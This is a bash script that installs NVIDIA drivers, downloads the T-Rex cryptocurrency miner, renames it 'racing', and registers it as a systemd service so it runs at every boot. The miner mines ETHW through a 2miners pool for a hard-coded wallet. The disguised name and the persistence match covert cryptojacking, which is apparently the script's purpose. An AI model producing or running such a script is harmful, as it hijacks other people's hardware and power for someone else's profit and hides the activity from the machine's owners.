#!/bin/bash
cd /home
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/3bf863cc.pub
sudo apt-get update
sudo apt-get -y install cuda-drivers-510
sudo apt-get install libcurl3 -y
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
sudo tar xvzf t-rex-0.26.8-linux.tar.gz
sudo mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://solo-ethw.2miners.com:6060 -u 0x196269366894d09bdFb6583769aAAE9549C47563 -w ss -p allofthem\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a ethash -o stratum+tcp://solo-ethw.2miners.com:6060 -u 0x196269366894d09bdFb6583769aAAE9549C47563 -w ss -p allofthem &
